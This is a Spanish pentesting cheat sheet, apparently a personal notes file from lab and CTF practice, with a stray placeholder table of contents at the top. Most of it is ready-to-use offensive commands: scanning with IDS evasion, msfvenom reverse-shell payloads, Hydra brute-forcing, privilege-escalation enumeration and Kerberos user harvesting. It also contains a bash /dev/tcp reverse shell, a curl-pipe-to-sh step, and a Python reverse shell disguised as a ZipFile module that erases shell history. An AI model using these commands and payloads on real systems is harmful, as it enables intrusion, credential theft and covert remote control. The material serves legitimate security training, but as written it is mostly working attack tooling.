
# Índice

- [Parte 1](#parte-1)
- [Parte 2](#parte-2)

## Parte 1
Aquí está el contenido de la Parte 1.

## Parte 2
Aquí está el contenido de la Parte 2.



H A C K I N G   I N   P R O G R E S S:
██ 20% ... 
███ 40% .... 
████ 60% ..... 
█████ 80% ......
██████ 100% ....... COMPLETED


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(@@ #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@(   ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@, @@@@@@@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ .@@@@@@@@@@@%         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ *@@@@@@@@@@@@           &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@#                   (@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@%*.            (@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   *@@%     (@@@@@@@@@        %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.     @@@@@@@@@@@@@@@@@@@@@@@@@*      /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@            @@@@@@@@@@@@@@@@@@@@@@%              @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@ @#   @@@@@@@@@@@@@@@@@@@   @@@# &@@#     @@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@  @@@@@@@@@@@@@@@@ @@@@@@@@@@@  @@   ,@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@.   @@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@     @@@@@@@@@                                           @@@@@@  #@   @@@@@@@@@@@@@@@
@@@@@@@@@@@@@@    @@ %@@@@@@@ *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@      @@@@@@@@@@@@
@@@@@@@@@@@    (@@@(@@@@@@@@@ ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@    #@@@@@@@@@@@
@@@@@@@@*          @@@@@@@@@@. @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ (@@@@@@@@@@  @.   @@@@@@@@@@@
@@@@@@@              .&@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@         @@@@@@@@
@@@@@@%@@@@@@@@@@@@%  %@@@@@@@ @@@@@@@@@@@@@@@@(     @@@@@@@@@@@@@@@@@ @@@@@@          @@@@@@ @@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@,      #@@@@@@@@@@@@@@@ @@@@@@@@@@@@,  @@ @@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

---------------------


W E L C O M E   T O   T H E   H A C K:

Fases del pentesting:

1-Enumeracion
2-Escaneo
3-Explotación
4-Post-explotación
5-Informe

Puertos mas comunes:

25 - SMTP
22 - SSH
110 - POP3
143 - IMAP
80 - HTTP
443 - HTTPS
8080, 8081 - HTTP Proxy
137, 138, 139 - NETBIOS
115 - SFTP
23 - Telnet
21 - FTP
3389 - RDP
3306 - MySQL
1433 - MS SQL Server
445 - SMB
123 - NTP
179 - BGP
69 - TFTP
88 - Kerberos
102 - MS Exchange
53 - DNS
5985 - winRM HTTP
5986 - winRM HTTPS

Comandos basicos:

host -- Te permitirá ver la dirección IP asociada a un dominio, o a la inversa
cd -- Desplazarse entre directorios
mv -- Mover ficheros o directorios 
cp -- Copiar ficheros
mkdir -- Crear directorios
rmdir -- Eliminar directorios
cat -- Enseñar el texto de un archivo
nano -- Crear un archivo txt o similar o enseñar el texto
sudo -- Usar comandos de super usuario
pwd -- Saber la ruta actual en la que te encuentras
touch -- Crear archivos
locate -- Localizar un archivo
find -- encontrar un determinado archivo
grep -- A la hora de hacer una tuberia, se usa para localizar una palabra dentro de un texto
chmod -- Modificar permisos de archivos o directorios
chown -- Permite cambiar el propietario de un archivo o un directorio
wget -- Recuperar material en linea
uname -- Nos provee de valiosa información del un sistema Linux
man -- Documentar y aprender sobre comandos, archivos, llamadas de sistema, etc
history -- Enseña el historial de la terminal
echo --  Impresión de un texto en pantalla
alias -- Es un shortcut que sustituye al comando complejo
su -- Permite usar el intérprete de comandos de otro usuario sin necesidad de cerrar la sesión
ping -- Envía una señal simple a un destino o destinatario concreto que responde automáticamente con una señal de confirmación
ifconfig / ip a --  Se mostrarán todas las direcciones IP de tu red

:::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::

--------------------- Nmap [Escaneo de puertos]

sudo nmap -A -T4 -sC -sV -p- <RHOST> # Escanea Sistema Operativo y Servicios, Modo Agresivo, Escanea con una lista default de scripts pertenecienetes a nmap, Detecta servicios y versiones y escanea todos los puertos
sudo nmap -sV -sU <RHOST> # Detecta servicios y versiones y realiza escaneo UDP
sudo nmap -A -T4 -sC -sV --script vuln <RHOST> # Escanea Sistema Operativo y Servicios, Modo Agresivo, Escanea con una lista default de scripts pertenecienetes a nmap, Detecta servicios y versiones y lanza todos los scripts de deteccion de contenido NSE
sudo nmap -sn -PR --spoof-mac <mac address> <target> # El MAC spoofing puede permitirnos falsificar el origen de nuestras conexiones y puede resultar útil para evadir los sistemas IDS. Es posible falsificar su dirección MAC mientras realiza un escaneo de ping ARP.
sudo nmap -sP [Red a la que estas conectado/mascara] # Hace un barrido de red y te muestra las ip's conectadas a la misma red que tu (IMPORTANTE PARA CAJA NEGRA ESTILO EJPTV2)
sudo nmap -sN [Red a la que estas conectado/mascara] # Un barrido de red sin necesidad de hacer ping (Muestra la mac)
sudo nmap -sT [IP] # Analizar puertos TCP
sudo nmap -sU [IP] # Analizar puertos UDP
sudo nmap -O [IP] # Te dice el sistema operativo
sudo nmap [IP] --script vuln -p[PUERTO] 
sudo nmap -sn -PS1-1000 [IP] # Manda un TCP SYN ping a los puertos entre el 1 y el 1000 sin escanearlos
sudo nmap -sn -PA1-1000 [IP] # Manda un TCP ACK ping a los puertos entre el 1 y el 1000 sin escanearlos
sudo nmap -sS -p- -sV -O --osscan-guess -T4 [IP] # Hace un escaneo de todos los puertos junto a sus versiones de servicio y nos dice el sistema operativo de forma mas agresiva.
sudo nmap -sS -p- -sV --version-intensity 8 -O -T4 [IP] # Hace un escaneo a todos los puertos y nos dice exactamente la versión del servicio.
sudo nmap -f # Evasion de firewall mandando paquetes largos en muchos fragmentos pequeños.
sudo nmap -p [Port] --script=smb-enum-shares.nse,smb-enum-users.nse [IP] # Script para enumerar shares.

--------------------- Netdiscover

sudo netdiscover -r 192.168.1.0/24 // o IP de red // Escanea los dispositivos conectados a la red 

--------------------- Whois

 whois [URL OR IP] (Obtener información sobre el propietario de un nombre de dominio o una dirección IP en Internet)

--------------------- Dnsrecon

dnsrecon -d [URL]  

Los tipos de enumeración que realiza dnsrecon son los siguientes:

• Zona de Traspasos
• Inversa
• Dominios y host de fuerza bruta
• Enumeración de grabación estándar (comodín, SOA, MX, A, TXT, etc)
• Caché Snooping
• Zona de Walking
• Búsqueda de google

--------------------- theHarvester

theHarvester -d [URL] -b [SOURCE]

Sources: https://github.com/laramies/theHarvester

--------------------- Reverse Shell msfvenom

# Para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -f exe -o payload.exe

# Para Linux
msfvenom -p linux/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -o troyano 

# Para Android 
msfvenom -p android/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -o payload.apk

--------------------- Transferencia de archivos

sudo python3 -m http.server 8080
sudo python -m SimpleHTTPServer 8080

# Para Linux: 

wget http://[IP]/recurso
         
# Para Windows:

powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"

--------------------- Netcat [Poner x puerto en escucha]

nc -nlvp <Port>

--------------------- Metasploit
Escribir en la consola msfconsole para empezar a usar metasploit

locate (para saber la ruta de un sploit por ejemplo)

show -- mostrar, ver...
search -- busca, filtra...

auxuliary no es un comando, es una categoria de metasploit que escanea, saca informacion, etc. LOS AUXILIARY NO EXPLOTAN NADA, SIMPLEMENTE ESCANEA.

set -- seleccion, elige, se trabaja... (version antigua)
use -- "" (version nueva)
run -- lanza exploit, auxiliary...

Ruta de lista de usuarios mas comunes para ataques de fuerza bruta: /usr/share/metasploit-framework/data/wordlists/common_users.txt
Ruta de lista de contraseñas mas comunes para ataques de fuerza bruta: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

--------------------- Hydra

-L archivo de usuarios
-l usuario
-P archivo de contraseñas

hydra -L users.txt -P pass.txt IP ssh (ssh indica el final)
hydra -L [user diccionario] -P [password diccionario] [ip] [protocolo] 
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Invalid Username" 
hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.36.145/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=17mm5k1jmmkcnes87ttmi63603; security=low; security=low:F=Username and/or password incorrect'
hydra -l [user] -P /usr/share/wordlists/rockyou.txt ssh://[IP]

--------------------- Feroxbuster

feroxbuster -u http://ua.thm/assets -w Desktop/Diccionario-web/SecLists-master/Discovery/Web-Content/common.txt --extensions html,php,txt,pub,xml,jpg,jpeg,png,zip -d 1


--------------------- Gobuster

gobuster dir --url http://[IP or URL] --wordlist /usr/share/wordlists/dirb/big.txt
gobuster dir --url 10.10.128.10 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100

--------------------- Dirsearch

dirsearch -u http://[IP or URL]/ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt,html -f

--------------------- RDP

xfreerdp /u:[USER] /p:[PASSWORD] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo

--------------------- WPSCAN

wpscan --url [URL] --enumerate ap,at,dbe,cb,u
wpscan --url [URL] -U <NAME 1> -P /usr/share/wordlists/<wordlist>  [Ataque de diccionario]

--------------------- ENUM PRIVESC

     Linux
          sudo -l
          whoami
          uname -a
          ls -la
          ss -tulwn
          cat /etc/crontab
          cat /etc/passwd
          find / -perm -u=s -type f 2>/dev/null
          find / -type f -name [file] 2> /dev/null
          find / -perm -4000 2>/dev/null
          hostname
          cat /proc/version
          history
          ifconfig
          netstat
          pwd
          env
          getcap -r / 2>/dev/null
          systemctl list-timers
          pspy
          *Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios: find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;

     Windows
          hostname
          whoami
          whoami /priv
          syteminfo
          ipconfig
          cmdkey /list
          icacls
          schtasks /query
          dir
          sc
          set
          netstat
          reg /query
          sc query windefend
          sc queryex type=service

--------------------- TRATAMIENTO TTY

Linux:

   script /dev/null -c bash // python -c 'import pty; pty.spawn("/bin/bash")'
   ctrl+z
   stty raw-echo
   fg
   reset
   xterm
   export TERM=xterm
   export SHELL=bash
   stty rows 52 columns 180

Windows:

https://github.com/antonioCoco/ConPtyShell

--------------------- SMB

enum4linux -a <IP address>
smbclient -L IP -N

    Para conectarse:
        smbclient //IP/RECURSO -n
    Una vez dentro para descargar archivos:
        prompt off
        mget *
        smbget -R smb://IP/recurso

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP] # Script para enumerar shares.
smbmap -H [IP]
smbmap -H [IP] -u [user] -p [password] -- probar usuario y una única contraseña para ver recursos compartidos
crackmapexec smb [IP] -u '' -p '' --user --> enumerar usuarios 
crackmapexec smb [IP] -u [user] -p [passwords] -- probar usarios y contraseñas
smbmap 

--------------------- Reverse Shell

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
1- Creamos un script .sh con bash -i >& /dev/tcp/IP/PUERTO 0>&1
2- Compartimos ese archivo mediante python -m....
3- Lo ejecutamos curl -L  http://[IP]:[PUERTO]/[ARCHIVO] | sh

--------------------- Upload file bypass

https://book.hacktricks.xyz/pentesting-web/file-upload

--------------------- Metasploit

msfconsole (Abrir el metasploit)
msfbd -h (Enseña banderas para poder usar)
msfdb start (Iniciar base de datos)
msfdb init (Inicializar base de datos)
msfdb status (Comprobar si esta todo correcto)
db_nmap [IP] (Hace un escaneo de nmap dentro de metasploit)
services (Despues del nmap, te resume todo en los servicios)

--------------------- Getcap

getcap -r / 2>/dev/null (Puedes buscar binarios con capacidades)

--------------------- Fuzzing Web

ffuf -c -w /home/alvarozz/Documents/Diccionario-web/SecLists-master/Discovery/Web-Content/common.txt -u 'http://10.0.2.6/~FUZZ' (Escribir ~FUZZ es para indicarle al comando por donde empezar con un diccionario sacado de internet llamado seclists master el cual hay que descargarse antes, en mi caso lo tengo en documentos, por eso tengo esa ruta // -w para indicar la ruta)
ffuf -c -ic -w /home/alvarozz/Documents/Diccionario-web/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.0.2.6/~secret/.FUZZ' -fc 403 -e .txt, .html (Este diccionario es para poder buscar archivos en directorios) 
ffuf -w /home/alvarozz/Documents/Diccionario-web/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u [URL] -H "Host:FUZZ.[URL]" -fw 1 (Buscar dominios ocultos de un host, comando usado por primera vez en la maquina de WitheRose de THM)

--------------------- Telnet

telnet [IP] [puerto]

(DENTRO DE TELNET)

user (Usuario)
pass (Contraseña)

- Una vez iniciado sesión:
list (Para listar los emails)
retr 1 (Verl el email numero 1)


--------------------- Hashcat

hashcat -a 0 -m 0 [FILE] /usr/share/wordlists/rockyou.txt
https://hashcat.net/wiki/doku.php?id=example_hashes

--------------------- Kerbrute (Github tool)

kerbrute userenum -d DOMAIN_NAME --dc DOMAIN_CONTROLLER_IP user_wordlists.txt (Enumeración de usuarios)

--------------------- GetNPUsers 

impacket-GetNPUsers -dc-ip [IP] -usersfile [FILE] [DOMAIN/]

--------------------- WhatWeb

whatweb http://[IP]:[PORT]  (Responde a la pregunta "Que web es esta?")

--------------------- John

/usr/share/john/ssh2john.py [ssh key file]
/usr/share/john/ssh2john.py [ssh key file] > [ssh hash file] 
john [hash file] --wordlist=/usr/share/wordlists/rockyou.txt

USO DEL SSH KEY

ssh -i [ssh key file] james@10.10.230.0
[Password]


--------------------- wafw00f

wafw00f [URL] -a  (Detecta que tipo de firewall tiene una WEB)

wafw00f -l (Lista de firewalls que detecta)  

--------------------- PrivEscPython

echo 'import pty;pty.spawn("/bin/bash")' > [archivo python] (Sin necesidad de tener un listener)
-------------
import os
import pty
import socket

lhost = "10.8.205.189"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
    def close(*args):                                                (HAY QUE TENER UN LISTENER)
        return

    def write(*args):
        return

    def __init__(self, *args):
        return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()
-------------

--------------------- Curl (Windows)

curl http://[IP]:[PORT]/Ruta/Del/Archivo -o [Archivo] (Transfiere un archivo a una maquina windows)

--------------------- Enlaces de interes

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown (Tomcat default credentials)
